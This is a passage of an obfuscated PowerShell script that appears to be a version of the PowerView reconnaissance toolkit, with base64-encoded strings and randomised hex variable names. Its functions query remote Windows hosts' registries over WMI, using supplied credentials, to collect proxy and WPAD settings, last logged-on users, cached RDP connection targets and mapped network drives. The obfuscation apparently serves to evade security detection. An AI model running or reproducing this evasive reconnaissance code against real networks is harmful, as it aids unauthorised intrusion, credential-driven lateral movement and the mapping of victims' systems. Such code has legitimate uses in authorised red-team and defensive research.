            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Get-WMIRegProxy {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = ${Env:ac645935110b4eaea96e7bf6f0b2d7f4},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            try {
                ${37906835ebea442091202157613e9fa5} = @{
                    'List' = $True
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                    'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    'Computername' = ${a9e149a622e146cb8c4c690f286bb4b0}
                    'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${37906835ebea442091202157613e9fa5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                ${eb39422b7d924b958e12297badd81382} = Get-WmiObject @37906835ebea442091202157613e9fa5
                ${ce081e5a91d149619816a7bc035e290e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzAA==')))
                ${83fbc75bb4f54a32b849c66a24d250d4} = 2147483649
                ${5931c8b719cc4b218ed7aa123cae0b4c} = ${eb39422b7d924b958e12297badd81382}.GetStringValue(${83fbc75bb4f54a32b849c66a24d250d4}, ${ce081e5a91d149619816a7bc035e290e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA==')))).sValue
                ${8ce7bff59ff14d9488e362a951d5dedf} = ${eb39422b7d924b958e12297badd81382}.GetStringValue(${83fbc75bb4f54a32b849c66a24d250d4}, ${ce081e5a91d149619816a7bc035e290e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA=')))).sValue
                ${80f5eba23f454df5ac0d064b50f33a59} = ''
                if (${8ce7bff59ff14d9488e362a951d5dedf} -and (${8ce7bff59ff14d9488e362a951d5dedf} -ne '')) {
                    try {
                        ${80f5eba23f454df5ac0d064b50f33a59} = (New-Object Net.WebClient).DownloadString(${8ce7bff59ff14d9488e362a951d5dedf})
                    }
                    catch {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAYwBvAG4AbgBlAGMAdABpAG4AZwAgAHQAbwAgAEEAdQB0AG8AQwBvAG4AZgBpAGcAVQBSAEwAIAA6ACAAJAB7ADgAYwBlADcAYgBmAGYANQA5AGYAZgAxADQAZAA5ADQAOAA4AGUAMwA2ADIAYQA5ADUAMQBkADUAZABlAGQAZgB9AA==')))
                    }
                }
                if (${5931c8b719cc4b218ed7aa123cae0b4c} -or ${8ce7bff59ff14d9488e362a951d5dedf}) {
                    ${135b3fb143bd49b987991226741987e6} = New-Object PSObject
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))) ${5931c8b719cc4b218ed7aa123cae0b4c}
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))) ${8ce7bff59ff14d9488e362a951d5dedf}
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBwAGEAZAA='))) ${80f5eba23f454df5ac0d064b50f33a59}
                    ${135b3fb143bd49b987991226741987e6}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwB4AHkAUwBlAHQAdABpAG4AZwBzAA=='))))
                    ${135b3fb143bd49b987991226741987e6}
                }
                else {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAATgBvACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHUAbgBkACAAZgBvAHIAIAAkAHsAYQBjADYANAA1ADkAMwA1ADEAMQAwAGIANABlAGEAZQBhADkANgBlADcAYgBmADYAZgAwAGIAMgBkADcAZgA0AH0A')))
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAZQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHIAIAAkAHsAYQBjADYANAA1ADkAMwA1ADEAMQAwAGIANABlAGEAZQBhADkANgBlADcAYgBmADYAZgAwAGIAMgBkADcAZgA0AH0AIAA6ACAAJABfAA==')))
            }
        }
    }
}
function Get-WMIRegLastLoggedOn {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${9dd4cbe0e86f4b928299d93cb1f2b072} = 2147483650
            ${37906835ebea442091202157613e9fa5} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${a9e149a622e146cb8c4c690f286bb4b0}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${37906835ebea442091202157613e9fa5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${95497154b7e54e72928191c2c215670f} = Get-WmiObject @37906835ebea442091202157613e9fa5
                ${ce081e5a91d149619816a7bc035e290e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
                ${b3874b8ac7dd49169d7fc6f9142c78e3} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
                ${dbdf791052be4aadbec08ad1af4d0fd2} = ${95497154b7e54e72928191c2c215670f}.GetStringValue(${9dd4cbe0e86f4b928299d93cb1f2b072}, ${ce081e5a91d149619816a7bc035e290e}, ${b3874b8ac7dd49169d7fc6f9142c78e3}).sValue
                ${67e0351efac142fc874da2d3dd3694c7} = New-Object PSObject
                ${67e0351efac142fc874da2d3dd3694c7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                ${67e0351efac142fc874da2d3dd3694c7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4A'))) ${dbdf791052be4aadbec08ad1af4d0fd2}
                ${67e0351efac142fc874da2d3dd3694c7}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAGEAcwB0AEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByAA=='))))
                ${67e0351efac142fc874da2d3dd3694c7}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEwAYQBzAHQATABvAGcAZwBlAGQATwBuAF0AIABFAHIAcgBvAHIAIABvAHAAZQBuAGkAbgBnACAAcgBlAG0AbwB0AGUAIAByAGUAZwBpAHMAdAByAHkAIABvAG4AIAAkAHsAYQA5AGUAMQA0ADkAYQA2ADIAMgBlADEANAA2AGMAYgA4AGMANABjADYAOQAwAGYAMgA4ADYAYgBiADQAYgAwAH0ALgAgAFIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbABpAGsAZQBsAHkAIABuAG8AdAAgAGUAbgBhAGIAbABlAGQALgA=')))
            }
        }
    }
}
function Get-WMIRegCachedRDPConnection {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${4b485f563e3d40138f4810ba541d5c48} = 2147483651
            ${37906835ebea442091202157613e9fa5} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${a9e149a622e146cb8c4c690f286bb4b0}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${37906835ebea442091202157613e9fa5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${95497154b7e54e72928191c2c215670f} = Get-WmiObject @37906835ebea442091202157613e9fa5
                ${d228b4badec04af2a2116c08c8f2a4d0} = (${95497154b7e54e72928191c2c215670f}.EnumKey(${4b485f563e3d40138f4810ba541d5c48}, '')).sNames | Where-Object { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${c4997f6119ed4d87b2cffbc1afeaccd5} in ${d228b4badec04af2a2116c08c8f2a4d0}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 ${c4997f6119ed4d87b2cffbc1afeaccd5} -Credential $Credential
                        }
                        else {
                            ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 ${c4997f6119ed4d87b2cffbc1afeaccd5}
                        }
                        ${fc39846dca154dff85974f9b7587a9f2} = ${95497154b7e54e72928191c2c215670f}.EnumValues(${4b485f563e3d40138f4810ba541d5c48},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA=')))).sNames
                        ForEach (${987d626ed1c04e3b819edffe6e93dc97} in ${fc39846dca154dff85974f9b7587a9f2}) {
                            if (${987d626ed1c04e3b819edffe6e93dc97} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                                ${4036d359ffe44c6692bd373809bec582} = ${95497154b7e54e72928191c2c215670f}.GetStringValue(${4b485f563e3d40138f4810ba541d5c48}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA='))), ${987d626ed1c04e3b819edffe6e93dc97}).sValue
                                ${5b0abe4cbe91441bb6f412e1f112a8f5} = New-Object PSObject
                                ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                                ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${25e26cdbb7fa4a6c9a2f2483c34b00e6}
                                ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${c4997f6119ed4d87b2cffbc1afeaccd5}
                                ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) ${4036d359ffe44c6692bd373809bec582}
                                ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                                ${5b0abe4cbe91441bb6f412e1f112a8f5}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                                ${5b0abe4cbe91441bb6f412e1f112a8f5}
                            }
                        }
                        ${b7ea34900a154dff9180b1697ce5f893} = ${95497154b7e54e72928191c2c215670f}.EnumKey(${4b485f563e3d40138f4810ba541d5c48},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwA=')))).sNames
                        ForEach ($Server in ${b7ea34900a154dff9180b1697ce5f893}) {
                            ${fea9e2eb98674d4a93c9291112408743} = ${95497154b7e54e72928191c2c215670f}.GetStringValue(${4b485f563e3d40138f4810ba541d5c48}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwBcACQAUwBlAHIAdgBlAHIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                            ${5b0abe4cbe91441bb6f412e1f112a8f5} = New-Object PSObject
                            ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                            ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${25e26cdbb7fa4a6c9a2f2483c34b00e6}
                            ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${c4997f6119ed4d87b2cffbc1afeaccd5}
                            ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                            ${5b0abe4cbe91441bb6f412e1f112a8f5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) ${fea9e2eb98674d4a93c9291112408743}
                            ${5b0abe4cbe91441bb6f412e1f112a8f5}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                            ${5b0abe4cbe91441bb6f412e1f112a8f5}
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgA6ACAAJABfAA==')))
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJAB7AGEAOQBlADEANAA5AGEANgAyADIAZQAxADQANgBjAGIAOABjADQAYwA2ADkAMABmADIAOAA2AGIAYgA0AGIAMAB9ACwAIABsAGkAawBlAGwAeQAgAGkAbgBzAHUAZgBmAGkAYwBpAGUAbgB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAbwByACAAZgBpAHIAZQB3AGEAbABsACAAcgB1AGwAZQBzACAAbwBuACAAaABvAHMAdAA6ACAAJABfAA==')))
            }
        }
    }
}
function Get-WMIRegMountedDrive {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${4b485f563e3d40138f4810ba541d5c48} = 2147483651
            ${37906835ebea442091202157613e9fa5} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${a9e149a622e146cb8c4c690f286bb4b0}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${37906835ebea442091202157613e9fa5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${95497154b7e54e72928191c2c215670f} = Get-WmiObject @37906835ebea442091202157613e9fa5
                ${d228b4badec04af2a2116c08c8f2a4d0} = (${95497154b7e54e72928191c2c215670f}.EnumKey(${4b485f563e3d40138f4810ba541d5c48}, '')).sNames | Where-Object { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${c4997f6119ed4d87b2cffbc1afeaccd5} in ${d228b4badec04af2a2116c08c8f2a4d0}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 ${c4997f6119ed4d87b2cffbc1afeaccd5} -Credential $Credential
                        }
                        else {
                            ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 ${c4997f6119ed4d87b2cffbc1afeaccd5}
                        }
                        ${1192662f6f3d4bd59a554e8c853adfb3} = (${95497154b7e54e72928191c2c215670f}.EnumKey(${4b485f563e3d40138f4810ba541d5c48}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwATgBlAHQAdwBvAHIAawA='))))).sNames
                        ForEach (${8907624d01df4d248c257761babab128} in ${1192662f6f3d4bd59a554e8c853adfb3}) {
                            ${3bf18e1ba318422b988e6eab54bbfbeb} = ${95497154b7e54e72928191c2c215670f}.GetStringValue(${4b485f563e3d40138f4810ba541d5c48}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwATgBlAHQAdwBvAHIAawBcACQAewA4ADkAMAA3ADYAMgA0AGQAMAAxAGQAZgA0AGQAMgA0ADgAYwAyADUANwA3ADYAMQBiAGEAYgBhAGIAMQAyADgAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))).sValue
                            ${6224d23cb684407283fecae306ceb78a} = ${95497154b7e54e72928191c2c215670f}.GetStringValue(${4b485f563e3d40138f4810ba541d5c48}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwATgBlAHQAdwBvAHIAawBcACQAewA4ADkAMAA3ADYAMgA0AGQAMAAxAGQAZgA0AGQAMgA0ADgAYwAyADUANwA3ADYAMQBiAGEAYgBhAGIAMQAyADgAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA=')))).sValue
                            ${85c05f3c31db4266b8e29aca0fce82c5} = ${95497154b7e54e72928191c2c215670f}.GetStringValue(${4b485f563e3d40138f4810ba541d5c48}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGMANAA5ADkANwBmADYAMQAxADkAZQBkADQAZAA4ADcAYgAyAGMAZgBmAGIAYwAxAGEAZgBlAGEAYwBjAGQANQB9AFwATgBlAHQAdwBvAHIAawBcACQAewA4ADkAMAA3ADYAMgA0AGQAMAAxAGQAZgA0AGQAMgA0ADgAYwAyADUANwA3ADYAMQBiAGEAYgBhAGIAMQAyADgAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))).sValue
                            if (-not ${25e26cdbb7fa4a6c9a2f2483c34b00e6}) { ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = '' }
                            if (${6224d23cb684407283fecae306ceb78a} -and (${6224d23cb684407283fecae306ceb78a} -ne '')) {
                                ${c75072bac42044cfa630131a26986efd} = New-Object PSObject
                                ${c75072bac42044cfa630131a26986efd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                                ${c75072bac42044cfa630131a26986efd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${25e26cdbb7fa4a6c9a2f2483c34b00e6}
                                ${c75072bac42044cfa630131a26986efd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${c4997f6119ed4d87b2cffbc1afeaccd5}
                                ${c75072bac42044cfa630131a26986efd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAEwAZQB0AHQAZQByAA=='))) ${8907624d01df4d248c257761babab128}
                                ${c75072bac42044cfa630131a26986efd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA'))) ${3bf18e1ba318422b988e6eab54bbfbeb}
                                ${c75072bac42044cfa630131a26986efd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUABhAHQAaAA='))) ${6224d23cb684407283fecae306ceb78a}
                                ${c75072bac42044cfa630131a26986efd} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAFUAcwBlAHIATgBhAG0AZQA='))) ${85c05f3c31db4266b8e29aca0fce82c5}
